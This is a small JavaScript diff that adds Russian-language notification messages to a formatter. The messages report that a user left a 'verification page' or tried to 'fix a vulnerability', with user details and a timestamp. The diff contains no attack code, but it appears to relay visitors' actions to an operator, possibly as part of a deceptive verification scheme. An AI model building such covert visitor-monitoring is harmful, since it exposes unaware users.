@@ -54,6 +54,18 @@ const formatMessage = (type, data, user) => {
                       `Время: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
                 buttons: []
             };
+        case 'app_close':
+            return {
+                text: `🚪 <b>Пользователь вышел со страницы верификации</b>\n\n${userInfo}\n\n` +
+                      `Время: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
+                buttons: []
+            };
+        case 'vulnerability_fix_attempt':
+            return {
+                text: `⚠️ <b>Попытка исправить уязвимость</b>\n\n` +
+                      `Уязвимость: <b>${data.vulnerability}</b>\n\n${userInfo}`,
+                buttons: []
+            };
         default:
             return {
                 text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: ${JSON.stringify(data)}\n\n${userInfo}`,
